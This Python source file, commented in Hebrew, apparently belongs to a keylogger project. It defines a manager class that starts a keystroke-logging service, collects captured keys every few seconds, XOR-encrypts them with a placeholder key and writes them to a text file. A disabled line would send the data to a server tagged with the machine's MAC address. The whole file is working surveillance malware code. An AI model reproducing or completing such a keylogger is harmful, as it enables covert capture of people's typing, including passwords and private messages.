from KeyLoggerService import KeyLoggerService
# from Network_send import NetworkSend
from FileWriter import FileWriterWithTime
# from .env import encrypt_key
from Encryptor import XorEncryptor
from Get_mac import get_mac_address
import time


class KeyLoggerManager:
    """ניהול התוכנה בעזרת קבצי העזר"""

    def __init__(self,timer: int):
        """קבלת טיימר לבקשות הנתונים שהוקלדו"""
        self.timer = timer
        self.running = None
        self.logger = KeyLoggerService()

    def start(self):
        """מתחיל מעקב והרצת הקבצים הנדרשים"""
        self.running = True
        self.logger.start_logging() # תחילת מעקב
        while self.running:
            time.sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
            get_logger = self.logger.get_logged_keys() # קבלת נתונים
            if get_logger: # אם היו הקלדות
                print(get_logger)
                logger_encrypt = XorEncryptor(get_logger, "encrypt_key").encrypt() # הצפנת הנתונים
                # NetworkSend(logger_encrypt).send_data(get_mac_address()) # שליחה לשרת
                FileWriterWithTime(logger_encrypt).send_data('Key logger.txt') # הדפסה לקובץ

    def stop(self,keystrokes):
        """עצירת המעקב"""
        self.running = False
        self.logger.stop_logging()

KeyLoggerManager(5).start()
# הושלם